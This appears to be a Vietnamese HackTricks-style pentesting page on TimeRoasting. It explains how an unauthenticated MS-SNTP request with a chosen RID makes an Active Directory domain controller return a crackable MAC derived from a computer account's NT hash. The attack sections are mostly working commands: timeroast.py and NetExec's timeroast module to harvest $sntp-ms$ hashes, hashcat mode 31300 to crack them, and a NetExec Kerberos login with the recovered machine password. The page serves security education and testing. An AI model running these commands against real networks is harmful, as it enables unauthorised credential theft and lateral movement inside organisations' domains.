# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting khai thác cơ chế xác thực MS-SNTP cũ. Một client chưa xác thực có thể gửi request dài 68 byte chứa RID tùy chọn của một computer account. Với đường dẫn cũ có thể bị khai thác, domain controller tạo response authenticator thông qua Netlogon bằng NT hash của computer account (secret mật khẩu được tạo từ MD4), cung cấp cho attacker một cặp challenge/MAC phù hợp để đoán mật khẩu offline (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Các mục 3.1.5.1 và 4 của MS-SNTP mô tả hành vi của request và response:<sup>[[1]](#references)</sup>
![TimeRoasting: Xem mục 3.1.5.1 "Authentication Request Behavior" và mục 4 "Protocol Examples" trong đặc tả MS-SNTP chính thức để biết chi tiết](../../images/Pasted%20image%2020250709114508.png)
Khi `ExtendedAuthenticatorSupported` là false, request lưu RID trong 31 bit thấp của Key Identifier trong authenticator và một bit chọn trong bit cao nhất. Server xác minh độ dài 68 byte, trích xuất RID, yêu cầu Netlogon tính các checksum ứng viên, chọn một checksum bằng bit cao nhất đó, đặt Key Identifier trong response thành 0, rồi trả về checksum đã chọn.<sup>[[1]](#references)</sup>

Crypto-checksum dựa trên MD5 (xem mục 3.2.5.1.1) và có thể bị crack offline, cho phép thực hiện roasting attack.<sup>[[1]](#references)</sup>

## Cách tấn công

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Các script Timeroasting của Tom Tervoort<sup>[[3]](#references)</sup>

```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```

---

## Tấn công thực tế (không xác thực) bằng NetExec + Hashcat

- Module `timeroast` của NetExec có thể liệt kê RID của máy tính, thu thập MAC MS-SNTP mà không cần xác thực và in ra các hash `$sntp-ms$` sẵn sàng để crack:<sup>[[4]](#references)</sup>

```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```

- Crack offline bằng Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>

```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```

- cleartext thu được tương ứng với mật khẩu tài khoản máy tính. Hãy thử dùng trực tiếp mật khẩu đó làm tài khoản máy với Kerberos (-k) khi NTLM bị vô hiệu hóa:

```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```

### Ghi chú vận hành
- Đảm bảo thời gian chính xác trước khi sử dụng thông tin xác thực đã khôi phục với Kerberos. Ưu tiên dùng ứng dụng khách NTP được duy trì, chẳng hạn như `chronyd`/`systemd-timesyncd`; `ntpdate` vẫn được giữ ở đây như một lệnh phổ biến trong phòng lab: `sudo ntpdate <dc_fqdn>`.
- Nếu cần, hãy tạo krb5.conf cho realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Sau này, hãy ánh xạ RID sang principal qua LDAP/BloodHound khi bạn đã có bất kỳ foothold nào đã xác thực.

## References

- [1] [MS-SNTP: Giao thức thời gian mạng đơn giản của Microsoft](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Sách trắng về Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — mã nguồn module `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Chế độ 31300 của Hashcat – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
